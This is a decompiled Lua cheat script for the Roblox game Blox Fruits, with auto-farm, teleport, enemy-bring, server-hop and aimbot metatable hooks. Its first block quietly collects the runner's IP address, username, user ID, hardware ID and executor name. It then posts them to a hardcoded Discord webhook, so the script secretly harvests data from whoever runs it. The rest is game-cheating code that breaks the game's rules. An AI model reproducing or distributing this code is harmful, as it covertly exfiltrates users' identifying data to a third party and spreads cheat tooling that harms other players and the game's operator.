-- ts file was generated at discord.gg/25ms


spawn(function()
    local vu1 = "https://discord.com/api/webhooks/1386925690452054027/c9l1LG26MKn7X-5okmcgLwzaA-W6XbEb7Iu83d0JyBuFUAiHxhZYlZNi262Ybq4euGKu"
    local v2 = game:GetService("HttpService")
    local vu3 = http_request or (request or syn.request)
    local v4 = v2:JSONDecode(vu3({
        ["Url"] = "https://httpbin.org/get",
        ["Method"] = "GET"
    }).Body).origin
    local v5 = game.PlaceId
    local v6 = game.JobId
    local vu7 = v2:JSONEncode({
        ["embeds"] = {
            {
                ["title"] = "New Executed",
                ["type"] = "rich",
                ["color"] = tonumber("1cff1a", 16),
                ["thumbnail"] = {
                    ["url"] = "https://media.discordapp.net/attachments/1231447151054426133/1250366927730245722/026501d682f2a072febf53559e23240a.gif?ex=666ff472&is=666ea2f2&hm=2236684547ae9830551c89447dabd03d0ac43718fa9d161b9a6e57f421aa7014&="
                },
                ["fields"] = {
                    {
                        ["name"] = "UserName / UserId",
                        ["value"] = string.format("```%s / %d```", game.Players.LocalPlayer.Name, game.Players.LocalPlayer.UserId),
                        ["inline"] = false
                    },
                    {
                        ["name"] = "Internet Protocol",
                        ["value"] = string.format("```%s```", tostring(v4)),
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Executor",
                        ["value"] = "```" .. identifyexecutor() .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Hardware ID",
                        ["value"] = string.format("```" .. gethwid() .. "```"),
                        ["inline"] = false
                    },
                    {
                        ["name"] = "JobId",
                        ["value"] = string.format("```%s```", v6),
                        ["inline"] = false
                    },
                    {
                        ["name"] = "Profile Link",
                        ["value"] = string.format("[Click Here](https://www.roblox.com/users/%d/profile)", game.Players.LocalPlayer.UserId),
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Game Link",
                        ["value"] = string.format("[Click Here](https://www.roblox.com/games/%d)", v5),
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Date",
                        ["value"] = string.format("```%s```", (function()
                            return os.date("%Y-%m-%d")
                        end)()),
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Time",
                        ["value"] = string.format("```%s```", (function()
                            return os.date("%H:%M:%S")
                        end)()),
                        ["inline"] = true
                    }
                }
            }
        }
    })
    local vu8 = {
        ["Content-Type"] = "application/json"
    }
    local v9, v10 = pcall(function()
		-- upvalues: (ref) vu3, (ref) vu1, (ref) vu7, (ref) vu8
        vu3({
            ["Url"] = vu1,
            ["Body"] = vu7,
            ["Method"] = "POST",
            ["Headers"] = vu8
        })
    end)
    if not v9 then
        warn("Error occurred while sending webhook:", v10)
    end
end)
ply = game.Players
plr = ply.LocalPlayer
Root = plr.Character.HumanoidRootPart
replicated = game:GetService("ReplicatedStorage")
Lv = game.Players.LocalPlayer.Data.Level.Value
TeleportService = game:GetService("TeleportService")
TW = game:GetService("TweenService")
Lighting = game:GetService("Lighting")
Enemies = workspace.Enemies
vim1 = game:GetService("VirtualInputManager")
vim2 = game:GetService("VirtualUser")
TeamSelf = plr.Team
RunSer = game:GetService("RunService")
Stats = game:GetService("Stats")
Energy = plr.Character.Energy.Value
Boss = {}
BringConnections = {}
MaterialList = {}
NPCList = {}
shouldTween = false
SoulGuitar = false
KenTest = true
debug = false
Brazier1 = false
Brazier2 = false
Brazier3 = false
Sec = 0.1
ClickState = 0
Num_self = 25
World1 = game.PlaceId == 2753915549
World2 = game.PlaceId == 4442272183
World3 = game.PlaceId == 7449423635
Sea = World1 or (World2 or World3) or plr:Kick("\226\157\140 Error : Only support Blox Fruit \226\157\140")
function Marines()
    replicated.Remotes.CommF_:InvokeServer("SetTeam", "Marines")
end
function Pirates()
    replicated.Remotes.CommF_:InvokeServer("SetTeam", "Pirates")
end
if World1 then
    Boss = {
        "The Gorilla King",
        "Bobby",
        "The Saw",
        "Yeti",
        "Mob Leader",
        "Vice Admiral",
        "Saber Expert",
        "Warden",
        "Chief Warden",
        "Swan",
        "Magma Admiral",
        "Fishman Lord",
        "Wysper",
        "Thunder God",
        "Cyborg",
        "Ice Admiral",
        "Greybeard"
    }
elseif World2 then
    Boss = {
        "Diamond",
        "Jeremy",
        "Fajita",
        "Don Swan",
        "Smoke Admiral",
        "Awakened Ice Admiral",
        "Tide Keeper",
        "Darkbeard",
        "Cursed Captain",
        "Order"
    }
elseif World3 then
    Boss = {
        "Stone",
        "Hydra Leader",
        "Kilo Admiral",
        "Captain Elephant",
        "Beautiful Pirate",
        "Cake Queen",
        "Longma",
        "Soul Reaper"
    }
end
if World1 then
    MaterialList = {
        "Leather + Scrap Metal",
        "Angel Wings",
        "Magma Ore",
        "Fish Tail"
    }
elseif World2 then
    MaterialList = {
        "Leather + Scrap Metal",
        "Radioactive Material",
        "Ectoplasm",
        "Mystic Droplet",
        "Magma Ore",
        "Vampire Fang"
    }
elseif World3 then
    MaterialList = {
        "Scrap Metal",
        "Demonic Wisp",
        "Conjured Cocoa",
        "Dragon Scale",
        "Gunpowder",
        "Fish Tail",
        "Mini Tusk"
    }
end
local vu11 = {
    "Snow Lurker",
    "Arctic Warrior",
    "Hidden Key",
    "Awakened Ice Admiral"
}
local vu12 = {
    "Part",
    "SpawnLocation",
    "Terrain",
    "WedgePart",
    "MeshPart"
}
local vu13 = {
    "Swan Pirate",
    "Jeremy"
}
local vu14 = {
    "Fajita",
    "Jeremy",
    "Diamond"
}
local vu15 = {
    "Cookie Crafter"
}
local vu16 = {
    "Reborn Skeleton"
}
local vu17 = {
    ["Pirate Millionaire"] = CFrame.new(- 712.82727050781, 98.577049255371, 5711.9541015625),
    ["Pistol Billionaire"] = CFrame.new(- 723.43316650391, 147.42906188965, 5931.9931640625),
    ["Dragon Crew Warrior"] = CFrame.new(7021.5043945312, 55.762702941895, - 730.12908935547),
    ["Dragon Crew Archer"] = CFrame.new(6625, 378, 244),
    ["Female Islander"] = CFrame.new(4692.7939453125, 797.97668457031, 858.84802246094),
    ["Venomous Assailant"] = CFrame.new(4902, 670, 39),
    ["Marine Commodore"] = CFrame.new(2401, 123, - 7589),
    ["Marine Rear Admiral"] = CFrame.new(3588, 229, - 7085),
    ["Fishman Raider"] = CFrame.new(- 10941, 332, - 8760),
    ["Fishman Captain"] = CFrame.new(- 11035, 332, - 9087),
    ["Forest Pirate"] = CFrame.new(- 13446, 413, - 7760),
    ["Mythological Pirate"] = CFrame.new(- 13510, 584, - 6987),
    ["Jungle Pirate"] = CFrame.new(- 11778, 426, - 10592),
    ["Musketeer Pirate"] = CFrame.new(- 13282, 496, - 9565),
    ["Reborn Skeleton"] = CFrame.new(- 8764, 142, 5963),
    ["Living Zombie"] = CFrame.new(- 10227, 421, 6161),
    ["Demonic Soul"] = CFrame.new(- 9579, 6, 6194),
    ["Posessed Mummy"] = CFrame.new(- 9579, 6, 6194),
    ["Peanut Scout"] = CFrame.new(- 1993, 187, - 10103),
    ["Peanut President"] = CFrame.new(- 2215, 159, - 10474),
    ["Ice Cream Chef"] = CFrame.new(- 877, 118, - 11032),
    ["Ice Cream Commander"] = CFrame.new(- 877, 118, - 11032),
    ["Cookie Crafter"] = CFrame.new(- 2021, 38, - 12028),
    ["Cake Guard"] = CFrame.new(- 2024, 38, - 12026),
    ["Baking Staff"] = CFrame.new(- 1932, 38, - 12848),
    ["Head Baker"] = CFrame.new(- 1932, 38, - 12848),
    ["Cocoa Warrior"] = CFrame.new(95, 73, - 12309),
    ["Chocolate Bar Battler"] = CFrame.new(647, 42, - 12401),
    ["Sweet Thief"] = CFrame.new(116, 36, - 12478),
    ["Candy Rebel"] = CFrame.new(47, 61, - 12889),
    ["Ghost"] = CFrame.new(5251, 5, 1111)
}
function EquipWeapon(p18)
    if p18 then
        if plr.Backpack:FindFirstChild(p18) then
            plr.Character.Humanoid:EquipTool(plr.Backpack:FindFirstChild(p18))
        end
    end
end
function weaponSc(p19)
    local v20, v21, v22 = pairs(plr.Backpack:GetChildren())
    while true do
        local v23
        v22, v23 = v20(v21, v22)
        if v22 == nil then
            break
        end
        if v23:IsA("Tool") and v23.ToolTip == p19 then
            EquipWeapon(v23.Name)
        end
    end
end
local v24 = workspace:FindFirstChild("Rocks")
if v24 then
    v24:Destroy()
end
gay = (function()
    local v25 = game:GetService("Lighting"):FindFirstChild("LightingLayers")
    local v26 = v25 and (game:GetService("Lighting") and (game:GetService("Lighting") and v25:FindFirstChild("DarkFog")))
    if v26 then
        v26:Destroy()
    end
    local v27 = workspace._WorldOrigin:FindFirstChild("Foam;")
    if v27 then
        v27:Destroy()
    end
end)()
local vu28 = {}
vu28.__index = vu28
function vu28.Alive(p29)
    if p29 then
        local v30 = p29:FindFirstChild("Humanoid")
        if v30 then
            v30 = v30.Health > 0
        end
        return v30
    end
end
function vu28.Pos(_, p31)
    return (Root.Position - mode.Position).Magnitude <= p31
end
function vu28.Dist(p32, p33)
    return (Root.Position - p32:FindFirstChild("HumanoidRootPart").Position).Magnitude <= p33
end
function vu28.DistH(p34, p35)
    return p35 < (Root.Position - p34:FindFirstChild("HumanoidRootPart").Position).Magnitude
end
function vu28.Kill(p36, p37)
    if p36 and p37 then
        if not p36:GetAttribute("Locked") then
            p36:SetAttribute("Locked", p36.HumanoidRootPart.CFrame)
        end
        PosMon = p36:GetAttribute("Locked").Position
        BringEnemy()
        EquipWeapon(_G.SelectWeapon)
        if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").ToolTip ~= "Blox Fruit" then
            _tp(p36.HumanoidRootPart.CFrame * CFrame.new(0, 30, 0) * CFrame.Angles(0, math.rad(180), 0))
        else
            _tp(p36.HumanoidRootPart.CFrame * CFrame.new(0, 10, 0) * CFrame.Angles(0, math.rad(90), 0))
        end
        if RandomCFrame then
            wait(0.5)
            _tp(p36.HumanoidRootPart.CFrame * CFrame.new(0, 30, 25))
            wait(0.5)
            _tp(p36.HumanoidRootPart.CFrame * CFrame.new(25, 30, 0))
            wait(0.5)
            _tp(p36.HumanoidRootPart.CFrame * CFrame.new(- 25, 30, 0))
            wait(0.5)
            _tp(p36.HumanoidRootPart.CFrame * CFrame.new(0, 30, 25))
            wait(0.5)
            _tp(p36.HumanoidRootPart.CFrame * CFrame.new(- 25, 30, 0))
        end
    end
end
function vu28.Kill2(p38, p39)
    if p38 and p39 then
        if not p38:GetAttribute("Locked") then
            p38:SetAttribute("Locked", p38.HumanoidRootPart.CFrame)
        end
        PosMon = p38:GetAttribute("Locked").Position
        BringEnemy()
        EquipWeapon(_G.SelectWeapon)
        if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").ToolTip ~= "Blox Fruit" then
            _tp(p38.HumanoidRootPart.CFrame * CFrame.new(0, 30, 8) * CFrame.Angles(0, math.rad(180), 0))
        else
            _tp(p38.HumanoidRootPart.CFrame * CFrame.new(0, 10, 0) * CFrame.Angles(0, math.rad(90), 0))
        end
        if RandomCFrame then
            wait(0.1)
            _tp(p38.HumanoidRootPart.CFrame * CFrame.new(0, 30, 25))
            wait(0.1)
            _tp(p38.HumanoidRootPart.CFrame * CFrame.new(25, 30, 0))
            wait(0.1)
            _tp(p38.HumanoidRootPart.CFrame * CFrame.new(- 25, 30, 0))
            wait(0.1)
            _tp(p38.HumanoidRootPart.CFrame * CFrame.new(0, 30, 25))
            wait(0.1)
            _tp(p38.HumanoidRootPart.CFrame * CFrame.new(- 25, 30, 0))
        end
    end
end
function vu28.KillSea(p40, p41)
    if p40 and p41 then
        if not p40:GetAttribute("Locked") then
            p40:SetAttribute("Locked", p40.HumanoidRootPart.CFrame)
        end
        PosMon = p40:GetAttribute("Locked").Position
        BringEnemy()
        EquipWeapon(_G.SelectWeapon)
        if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").ToolTip ~= "Blox Fruit" then
            notween(p40.HumanoidRootPart.CFrame * CFrame.new(0, 50, 8))
            wait(0.85)
            notween(p40.HumanoidRootPart.CFrame * CFrame.new(0, 400, 0))
            wait(1)
        else
            _tp(p40.HumanoidRootPart.CFrame * CFrame.new(0, 10, 0) * CFrame.Angles(0, math.rad(90), 0))
        end
    end
end
function vu28.Sword(p42, p43)
    if p42 and p43 then
        if not p42:GetAttribute("Locked") then
            p42:SetAttribute("Locked", p42.HumanoidRootPart.CFrame)
        end
        PosMon = p42:GetAttribute("Locked").Position
        BringEnemy()
        weaponSc("Sword")
        _tp(p42.HumanoidRootPart.CFrame * CFrame.new(0, 30, 0))
        if RandomCFrame then
            wait(0.1)
            _tp(p42.HumanoidRootPart.CFrame * CFrame.new(0, 30, 25))
            wait(0.1)
            _tp(p42.HumanoidRootPart.CFrame * CFrame.new(25, 30, 0))
            wait(0.1)
            _tp(p42.HumanoidRootPart.CFrame * CFrame.new(- 25, 30, 0))
            wait(0.1)
            _tp(p42.HumanoidRootPart.CFrame * CFrame.new(0, 30, 25))
            wait(0.1)
            _tp(p42.HumanoidRootPart.CFrame * CFrame.new(- 25, 30, 0))
        end
    end
end
function vu28.Mas(p44, p45)
    if p44 and p45 then
        if not p44:GetAttribute("Locked") then
            p44:SetAttribute("Locked", p44.HumanoidRootPart.CFrame)
        end
        PosMon = p44:GetAttribute("Locked").Position
        BringEnemy()
        if p44.Humanoid.Health > HealthM then
            weaponSc("Melee")
            _tp(p44.HumanoidRootPart.CFrame * CFrame.new(0, 30, 0))
        else
            _tp(p44.HumanoidRootPart.CFrame * CFrame.new(0, 20, 0))
            Useskills("Blox Fruit", "Z")
            Useskills("Blox Fruit", "X")
            Useskills("Blox Fruit", "C")
        end
    end
end
function vu28.Masgun(p46, p47)
    if p46 and p47 then
        if not p46:GetAttribute("Locked") then
            p46:SetAttribute("Locked", p46.HumanoidRootPart.CFrame)
        end
        PosMon = p46:GetAttribute("Locked").Position
        BringEnemy()
        if p46.Humanoid.Health > HealthM then
            weaponSc("Melee")
            _tp(p46.HumanoidRootPart.CFrame * CFrame.new(0, 30, 0))
        else
            _tp(p46.HumanoidRootPart.CFrame * CFrame.new(0, 35, 8))
            Useskills("Gun", "Z")
            Useskills("Gun", "X")
        end
    end
end
function statsSetings(p48, p49)
    if p48 == "Melee" then
        if plr.Data.Points.Value ~= 0 then
            replicated.Remotes.CommF_:InvokeServer("AddPoint", "Melee", p49)
        end
    elseif p48 == "Defense" then
        if plr.Data.Points.Value ~= 0 then
            replicated.Remotes.CommF_:InvokeServer("AddPoint", "Defense", p49)
        end
    elseif p48 == "Sword" then
        if plr.Data.Points.Value ~= 0 then
            replicated.Remotes.CommF_:InvokeServer("AddPoint", "Sword", p49)
        end
    elseif p48 == "Gun" then
        if plr.Data.Points.Value ~= 0 then
            replicated.Remotes.CommF_:InvokeServer("AddPoint", "Gun", p49)
        end
    elseif p48 == "Devil" and plr.Data.Points.Value ~= 0 then
        replicated.Remotes.CommF_:InvokeServer("AddPoint", "Demon Fruit", p49)
    end
end
function BringEnemy()
    if _B then
        local v50, v51, v52 = pairs(workspace.Enemies:GetChildren())
        while true do
            local v53
            v52, v53 = v50(v51, v52)
            if v52 == nil then
                break
            end
            if v53:FindFirstChild("Humanoid") and (v53.Humanoid.Health > 0 and (v53.PrimaryPart.Position - PosMon).Magnitude <= 300) then
                v53.PrimaryPart.CFrame = CFrame.new(PosMon)
                v53.PrimaryPart.CanCollide = true
                v53:FindFirstChild("Humanoid").WalkSpeed = 0
                v53:FindFirstChild("Humanoid").JumpPower = 0
                if v53.Humanoid:FindFirstChild("Animator") then
                    v53.Humanoid.Animator:Destroy()
                end
                plr.SimulationRadius = math.huge
            end
        end
    end
end
function Useskills(p54, p55)
    if p54 == "Melee" then
        weaponSc("Melee")
        if p55 == "Z" then
            vim1:SendKeyEvent(true, "Z", false, game)
            vim1:SendKeyEvent(false, "Z", false, game)
        elseif p55 == "X" then
            vim1:SendKeyEvent(true, "X", false, game)
            vim1:SendKeyEvent(false, "X", false, game)
        elseif p55 == "C" then
            vim1:SendKeyEvent(true, "C", false, game)
            vim1:SendKeyEvent(false, "C", false, game)
        end
    elseif p54 == "Sword" then
        weaponSc("Sword")
        if p55 == "Z" then
            vim1:SendKeyEvent(true, "Z", false, game)
            vim1:SendKeyEvent(false, "Z", false, game)
        elseif p55 == "X" then
            vim1:SendKeyEvent(true, "X", false, game)
            vim1:SendKeyEvent(false, "X", false, game)
        end
    elseif p54 == "Blox Fruit" then
        weaponSc("Blox Fruit")
        if p55 == "Z" then
            vim1:SendKeyEvent(true, "Z", false, game)
            vim1:SendKeyEvent(false, "Z", false, game)
        elseif p55 == "X" then
            vim1:SendKeyEvent(true, "X", false, game)
            vim1:SendKeyEvent(false, "X", false, game)
        elseif p55 == "C" then
            vim1:SendKeyEvent(true, "C", false, game)
            vim1:SendKeyEvent(false, "C", false, game)
        elseif p55 == "V" then
            vim1:SendKeyEvent(true, "V", false, game)
            vim1:SendKeyEvent(false, "V", false, game)
        end
    elseif p54 == "Gun" then
        weaponSc("Gun")
        if p55 == "Z" then
            vim1:SendKeyEvent(true, "Z", false, game)
            vim1:SendKeyEvent(false, "Z", false, game)
        elseif p55 == "X" then
            vim1:SendKeyEvent(true, "X", false, game)
            vim1:SendKeyEvent(false, "X", false, game)
        end
    end
    if p54 == "nil" and p55 == "Y" then
        vim1:SendKeyEvent(true, "Y", false, game)
        vim1:SendKeyEvent(false, "Y", false, game)
    end
end
local v56 = getrawmetatable(game)
local vu57 = v56.__namecall
setreadonly(v56, false)
v56.__namecall = newcclosure(function(...)
	-- upvalues: (ref) vu57
    local v58 = getnamecallmethod()
    local v59 = {
        ...
    }
    if tostring(v58) ~= "FireServer" or (tostring(v59[1]) ~= "RemoteEvent" or (tostring(v59[2]) == "true" or tostring(v59[2]) == "false")) or (not _G.FarmMastery_G or SoulGuitar) and (not _G.FarmMastery_Dev and (not _G.FarmBlazeEM and (not _G.Prehis_Skills and (not _G.SeaBeast1 and (not _G.FishBoat and (not _G.PGB and (not _G.Leviathan1 and (not _G.Complete_Trials and (not _G.AimMethod or ABmethod ~= "AimBots Skill")))))))) and (not _G.AimMethod or ABmethod ~= "Auto Aimbots")) then
        return vu57(...)
    end
    v59[2] = MousePos
    return vu57(unpack(v59))
end)
function GetConnectionEnemies(p60)
    local v61, v62, v63 = pairs(replicated:GetChildren())
    while true do
        local v64
        v63, v64 = v61(v62, v63)
        if v63 == nil then
            break
        end
        if v64:IsA("Model") and (typeof(p60) == "table" and table.find(p60, v64.Name) or v64.Name == p60) and (v64:FindFirstChild("Humanoid") and v64.Humanoid.Health > 0) then
            return v64
        end
    end
    local v65 = next
    local v66, v67 = game.Workspace.Enemies:GetChildren()
    while true do
        local v68
        v67, v68 = v65(v66, v67)
        if v67 == nil then
            break
        end
        if v68:IsA("Model") and (typeof(p60) == "table" and table.find(p60, v68.Name) or v68.Name == p60) and (v68:FindFirstChild("Humanoid") and v68.Humanoid.Health > 0) then
            return v68
        end
    end
end
function LowCpu()
    local v69 = game
    local v70 = v69.Workspace
    local v71 = v69.Lighting
    local v72 = v70.Terrain
    v72.WaterWaveSize = 0
    v72.WaterWaveSpeed = 0
    v72.WaterReflectance = 0
    v72.WaterTransparency = 0
    v71.GlobalShadows = false
    v71.FogEnd = 9000000000
    v71.Brightness = 0
    settings().Rendering.QualityLevel = "Level01"
    local v73, v74, v75 = pairs(v69:GetDescendants())
    local v76 = true
    while true do
        local v77
        v75, v77 = v73(v74, v75)
        if v75 == nil then
            break
        end
        if v77:IsA("Part") or (v77:IsA("Union") or (v77:IsA("CornerWedgePart") or v77:IsA("TrussPart"))) then
            v77.Material = "Plastic"
            v77.Reflectance = 0
        elseif v77:IsA("Decal") or v77:IsA("Texture") and v76 then
            v77.Transparency = 1
        elseif v77:IsA("ParticleEmitter") or v77:IsA("Trail") then
            v77.Lifetime = NumberRange.new(0)
        elseif v77:IsA("Explosion") then
            v77.BlastPressure = 1
            v77.BlastRadius = 1
        elseif v77:IsA("Fire") or (v77:IsA("SpotLight") or (v77:IsA("Smoke") or v77:IsA("Sparkles"))) then
            v77.Enabled = false
        elseif v77:IsA("MeshPart") then
            v77.Material = "Plastic"
            v77.Reflectance = 0
            v77.TextureID = 1.0385902758728956e16
        end
    end
    local v78, v79, v80 = pairs(v71:GetChildren())
    while true do
        local v81
        v80, v81 = v78(v79, v80)
        if v80 == nil then
            break
        end
        if v81:IsA("BlurEffect") or (v81:IsA("SunRaysEffect") or (v81:IsA("ColorCorrectionEffect") or (v81:IsA("BloomEffect") or v81:IsA("DepthOfFieldEffect")))) then
            v81.Enabled = false
        end
    end
end
function CheckF()
    if GetBP("Dragon-Dragon") or (GetBP("Gas-Gas") or (GetBP("Yeti-Yeti") or (GetBP("Kitsune-Kitsune") or GetBP("T-Rex-T-Rex")))) then
        return true
    end
end
function CheckBoat()
    local v82, v83, v84 = pairs(workspace.Boats:GetChildren())
    while true do
        local v85
        v84, v85 = v82(v83, v84)
        if v84 == nil then
            break
        end
        if tostring(v85.Owner.Value) == tostring(plr.Name) then
            return v85
        end
    end
    return false
end
function CheckEnemiesBoat()
    local v86, v87, v88 = pairs(workspace.Enemies:GetChildren())
    while true do
        local v89
        v88, v89 = v86(v87, v88)
        if v88 == nil then
            break
        end
        if v89.Name == "FishBoat" and v89:FindFirstChild("Health").Value > 0 then
            return true
        end
    end
    return false
end
function CheckPirateGrandBrigade()
    local v90, v91, v92 = pairs(workspace.Enemies:GetChildren())
    while true do
        local v93
        v92, v93 = v90(v91, v92)
        if v92 == nil then
            break
        end
        if (v93.Name == "PirateGrandBrigade" or v93.Name == "PirateBrigade") and v93:FindFirstChild("Health").Value > 0 then
            return true
        end
    end
    return false
end
function CheckShark()
	-- upvalues: (ref) vu28
    local v94, v95, v96 = pairs(workspace.Enemies:GetChildren())
    while true do
        local v97
        v96, v97 = v94(v95, v96)
        if v96 == nil then
            break
        end
        if v97.Name == "Shark" and vu28.Alive(v97) then
            return true
        end
    end
    return false
end
function CheckTerrorShark()
	-- upvalues: (ref) vu28
    local v98, v99, v100 = pairs(workspace.Enemies:GetChildren())
    while true do
        local v101
        v100, v101 = v98(v99, v100)
        if v100 == nil then
            break
        end
        if v101.Name == "Terrorshark" and vu28.Alive(v101) then
            return true
        end
    end
    return false
end
function CheckPiranha()
	-- upvalues: (ref) vu28
    local v102, v103, v104 = pairs(workspace.Enemies:GetChildren())
    while true do
        local v105
        v104, v105 = v102(v103, v104)
        if v104 == nil then
            break
        end
        if v105.Name == "Piranha" and vu28.Alive(v105) then
            return true
        end
    end
    return false
end
function CheckFishCrew()
	-- upvalues: (ref) vu28
    local v106, v107, v108 = pairs(workspace.Enemies:GetChildren())
    while true do
        local v109
        v108, v109 = v106(v107, v108)
        if v108 == nil then
            break
        end
        if (v109.Name == "Fish Crew Member" or v109.Name == "Haunted Crew Member") and vu28.Alive(v109) then
            return true
        end
    end
    return false
end
function CheckHauntedCrew()
	-- upvalues: (ref) vu28
    local v110, v111, v112 = pairs(workspace.Enemies:GetChildren())
    while true do
        local v113
        v112, v113 = v110(v111, v112)
        if v112 == nil then
            break
        end
        if v113.Name == "Haunted Crew Member" and vu28.Alive(v113) then
            return true
        end
    end
    return false
end
function CheckSeaBeast()
    return workspace.SeaBeasts:FindFirstChild("SeaBeast1") and true or false
end
function CheckLeviathan()
    return workspace.SeaBeasts:FindFirstChild("Leviathan") and true or false
end
function UpdStFruit()
    local v114 = next
    local v115, v116 = plr.Backpack:GetChildren()
    while true do
        local v117
        v116, v117 = v114(v115, v116)
        if v116 == nil then
            break
        end
        StoreFruit = v117:FindFirstChild("EatRemote", true)
        if StoreFruit then
            replicated.Remotes.CommF_:InvokeServer("StoreFruit", StoreFruit.Parent:GetAttribute("OriginalName"), plr.Backpack:FindFirstChild(v117.Name))
        end
    end
end
function collectFruits(p118)
    if p118 then
        local v119 = plr.Character
        local v120, v121, v122 = pairs(workspace:GetChildren())
        while true do
            local v123
            v122, v123 = v120(v121, v122)
            if v122 == nil then
                break
            end
            if string.find(v123.Name, "Fruit") then
                v123.Handle.CFrame = v119.HumanoidRootPart.CFrame
            end
        end
    end
end
function Getmoon()
    if World1 then
        return Lighting.FantasySky.MoonTextureId
    end
    if World2 then
        return Lighting.FantasySky.MoonTextureId
    end
    if World3 then
        return Lighting.Sky.MoonTextureId
    end
end
function DropFruits()
    local v124 = next
    local v125, v126 = plr.Backpack:GetChildren()
    while true do
        local v127
        v126, v127 = v124(v125, v126)
        if v126 == nil then
            break
        end
        if string.find(v127.Name, "Fruit") then
            EquipWeapon(v127.Name)
            wait(0.1)
            if plr.PlayerGui.Main.Dialogue.Visible == true then
                plr.PlayerGui.Main.Dialogue.Visible = false
            end
            EquipWeapon(v127.Name)
            plr.Character:FindFirstChild(v127.Name).EatRemote:InvokeServer("Drop")
        end
    end
    local v128, v129, v130 = pairs(plr.Character:GetChildren())
    while true do
        local v131
        v130, v131 = v128(v129, v130)
        if v130 == nil then
            break
        end
        if string.find(v131.Name, "Fruit") then
            EquipWeapon(v131.Name)
            wait(0.1)
            if plr.PlayerGui.Main.Dialogue.Visible == true then
                plr.PlayerGui.Main.Dialogue.Visible = false
            end
            EquipWeapon(v131.Name)
            plr.Character:FindFirstChild(v131.Name).EatRemote:InvokeServer("Drop")
        end
    end
end
function GetBP(p132)
    return plr.Backpack:FindFirstChild(p132) or plr.Character:FindFirstChild(p132)
end
function GetIn(p133)
    local v134, v135, v136 = pairs(replicated.Remotes.CommF_:InvokeServer("getInventory"))
    while true do
        local v137
        v136, v137 = v134(v135, v136)
        if v136 == nil then
            break
        end
        if type(v137) == "table" and (v137.Name == p133 or (plr.Character:FindFirstChild(p133) or plr.Backpack:FindFirstChild(p133))) then
            return true
        end
    end
    return false
end
function GetM(p138)
    local v139, v140, v141 = pairs(replicated.Remotes.CommF_:InvokeServer("getInventory"))
    while true do
        local v142
        v141, v142 = v139(v140, v141)
        if v141 == nil then
            break
        end
        if type(v142) == "table" and (v142.Type == "Material" and v142.Name == p138) then
            return v142.Count
        end
    end
    return 0
end
function GetWP(p143)
    local v144, v145, v146 = pairs(replicated.Remotes.CommF_:InvokeServer("getInventory"))
    while true do
        local v147
        v146, v147 = v144(v145, v146)
        if v146 == nil then
            break
        end
        if type(v147) == "table" and v147.Type == "Sword" and (v147.Name == p143 or (plr.Character:FindFirstChild(p143) or plr.Backpack:FindFirstChild(p143))) then
            return true
        end
    end
    return false
end
function getInfinity_Ability(p148, pu149)
    if Root then
        if p148 == "Soru" and pu149 then
            local v150 = next
            local v151, v152 = getgc()
            while true do
                local v153
                v152, v153 = v150(v151, v152)
                if v152 == nil then
                    break
                end
                if plr.Character.Soru and (typeof(v153) == "function" and getfenv(v153).script == plr.Character.Soru) then
                    local v154 = next
                    local v155, v156 = getupvalues(v153)
                    while true do
                        local v157
                        v156, v157 = v154(v155, v156)
                        if v156 == nil then
                            break
                        end
                        if typeof(v157) == "table" then
                            repeat
                                wait(Sec)
                                v157.LastUse = 0
                            until not pu149 or plr.Character.Humanoid.Health <= 0
                        end
                    end
                end
            end
        elseif p148 == "Energy" and pu149 then
            plr.Character.Energy.Changed:connect(function()
				-- upvalues: (ref) pu149
                if pu149 then
                    plr.Character.Energy.Value = Energy
                end
            end)
        elseif p148 == "Observation" and pu149 then
            plr.VisionRadius.Value = math.huge
        end
    end
end
function Hop()
    pcall(function()
        for v158 = math.random(1, math.random(40, 75)), 100 do
            local v159 = replicated.__ServerBrowser:InvokeServer(v158)
            local v160 = next
            local v161 = nil
            while true do
                local v162
                v161, v162 = v160(v159, v161)
                if v161 == nil then
                    break
                end
                if tonumber(v162.Count) < 12 then
                    TeleportService:TeleportToPlaceInstance(game.PlaceId, v161)
                end
            end
        end
    end)
end
local vu163 = Instance.new("Part", workspace)
vu163.Size = Vector3.new(1, 1, 1)
vu163.Name = "Rip_Indra"
vu163.Anchored = true
vu163.CanCollide = false
vu163.CanTouch = false
vu163.Transparency = 1
local v164 = workspace:FindFirstChild(vu163.Name)
if v164 and v164 ~= vu163 then
    v164:Destroy()
end
task.spawn(function()
	-- upvalues: (ref) vu163
    while task.wait() do
        if vu163 and vu163.Parent == workspace then
            if shouldTween then
                getgenv().OnFarm = true
            else
                getgenv().OnFarm = false
            end
        else
            getgenv().OnFarm = false
        end
    end
end)
task.spawn(function()
	-- upvalues: (ref) vu163
    local vu165 = game.Players.LocalPlayer
    repeat
        task.wait()
    until vu165.Character and vu165.Character.PrimaryPart
    vu163.CFrame = vu165.Character.PrimaryPart.CFrame
    while task.wait() do
        pcall(function()
			-- upvalues: (ref) vu163, (ref) vu165
            if getgenv().OnFarm then
                if vu163 and vu163.Parent == workspace then
                    local v166 = vu165.Character
                    if v166 then
                        v166 = vu165.Character.PrimaryPart
                    end
                    if v166 and (v166.Position - vu163.Position).Magnitude <= 200 then
                        v166.CFrame = vu163.CFrame
                    else
                        vu163.CFrame = v166.CFrame
                    end
                end
                local v167 = vu165.Character
                if v167 then
                    local v168, v169, v170 = pairs(v167:GetChildren())
                    while true do
                        local v171
                        v170, v171 = v168(v169, v170)
                        if v170 == nil then
                            break
                        end
                        if v171:IsA("BasePart") then
                            v171.CanCollide = false
                        end
                    end
                end
            else
                local v172 = vu165.Character
                if v172 then
                    local v173, v174, v175 = pairs(v172:GetChildren())
                    while true do
                        local v176
                        v175, v176 = v173(v174, v175)
                        if v175 == nil then
                            break
                        end
                        if v176:IsA("BasePart") then
                            v176.CanCollide = true
                        end
                    end
                end
            end
        end)
    end
end)
function _tp(p177)
	-- upvalues: (ref) vu163
    local v178 = plr.Character
    if v178 and v178:FindFirstChild("HumanoidRootPart") then
        local v179 = v178.HumanoidRootPart
        local v180 = (p177.Position - v179.Position).Magnitude
        local v181 = TweenInfo.new(v180 / 300, Enum.EasingStyle.Linear)
        local vu182 = game:GetService("TweenService"):Create(vu163, v181, {
            ["CFrame"] = p177
        })
